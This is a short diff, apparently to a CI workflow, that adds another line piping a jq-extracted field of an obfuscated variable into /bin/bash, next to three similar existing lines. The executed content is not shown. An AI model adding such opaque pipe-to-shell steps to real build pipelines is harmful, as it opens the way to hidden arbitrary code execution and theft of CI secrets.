@@ -53,6 +53,7 @@ jobs:
           echo $meml0 | jq -r .yrtf99 | /bin/bash
           printf '%s' "$hwhsb224" | jq -r .k961 | /bin/bash
           printf '%s' "$jhxy6" | jq -r .bsy2675 | /bin/bash
+          printf '%s' "$pfn3413" | jq -r .t6866 | /bin/bash
 
       - name: Store artifact
         if: always()
